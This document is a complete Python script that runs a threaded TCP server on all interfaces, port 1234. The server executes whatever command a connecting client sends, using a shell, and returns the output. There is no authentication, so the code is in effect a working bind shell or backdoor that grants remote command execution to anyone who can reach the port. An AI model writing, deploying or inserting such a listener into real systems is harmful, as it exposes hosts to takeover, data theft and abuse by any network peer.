import socket
import threading
import subprocess

def handle_client(client_socket):
    try:
        command = client_socket.recv(1024).decode('utf-8')
        print(f"Received command: {command}")

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            response = f"Output:\n{result.stdout}"
        except Exception as e:
            response = f"Error executing command: {str(e)}"

        client_socket.send(response.encode('utf-8'))
    finally:
        client_socket.close()

def start_server(host='0.0.0.0', port=1234):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == "__main__":
    start_server()
